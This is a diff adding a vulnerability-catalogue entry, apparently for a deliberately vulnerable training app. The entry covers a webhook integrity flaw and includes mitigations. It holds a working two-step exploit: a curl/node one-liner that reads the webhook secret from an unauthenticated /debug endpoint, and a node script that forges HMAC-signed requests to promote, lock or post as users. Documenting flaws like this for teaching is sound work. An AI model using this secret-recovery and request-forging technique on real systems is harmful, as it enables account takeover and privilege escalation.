@@ -213,6 +213,56 @@ V-SOC-024  Session cookie lacks security flags
 
 
 -----------------------------------------------------------------
+SOFTWARE & DATA INTEGRITY (A08, Ch 35)
+-----------------------------------------------------------------
+
+V-SOC-025  Webhook HMAC chain — secret leak + non-constant-time compare
+  Location:  routes/integrity.js (S-INT-001)
+             POST /webhook/internal
+  Notes:     /webhook is mounted BEFORE bodyParser.json so the route
+             can verify the HMAC over the raw request bytes — the same
+             bypass quirk attackers fingerprint when they probe webhook
+             endpoints in the wild.
+  Exploit:   Step 1 -- recover the shared secret from /debug:
+               curl -s http://127.0.0.1:3003/debug \
+                 | node -e "let s='';process.stdin.on('data',d=>s+=d) \
+                            .on('end',()=>{console.log(JSON.parse(s).env.PULSE_WEBHOOK_SECRET);})"
+               # -> pulse-webhook-2025-shared-with-CI
+             Step 2 -- forge a signed request that promotes any account:
+               node -e "
+                 const c=require('crypto'),h=require('http');
+                 const b=Buffer.from('{\"action\":\"promote_user\",\"username\":\"aria\"}');
+                 const s=c.createHmac('sha256','pulse-webhook-2025-shared-with-CI')
+                          .update(b).digest('hex');
+                 const r=h.request({host:'localhost',port:3003,path:'/webhook/internal',
+                   method:'POST',headers:{'X-Hook-Sig':s,'Content-Type':'application/json',
+                   'Content-Length':b.length}},res=>{let d='';res.on('data',x=>d+=x);
+                   res.on('end',()=>console.log(res.statusCode,d));});
+                 r.write(b);r.end();
+               "
+               # -> 200 {"ok":true,"action":"promote_user","target":"aria","changes":1}
+             Other actions in the same handler:
+               {"action":"lock_user","username":"<u>"}   -- forces is_private=1
+               {"action":"post_as","username":"<u>","body":"<text>"}
+  Why A08:   The webhook delivers privileged state changes. Neither the
+             signing key (recoverable via /debug) nor the comparison
+             function (string `==` instead of crypto.timingSafeEqual)
+             provides real integrity. The same shape ships in production
+             when teams put webhook secrets in env vars that are then
+             dumped by /actuator, /debug, or Kubernetes leaks.
+  Mitigation:
+             - Never leak secrets through /debug or any unauthenticated
+               endpoint (see Ch 17 / Ch 33).
+             - Replace `expected == provided` with
+               `crypto.timingSafeEqual(Buffer.from(expected,'hex'),
+                                       Buffer.from(provided,'hex'))`
+               after length check.
+             - Rotate the secret whenever /debug is suspected leaked.
+             - Add per-event idempotency keys and replay protection
+               (timestamp + window).
+
+
+-----------------------------------------------------------------
 ACCESS CONTROL
 -----------------------------------------------------------------
 
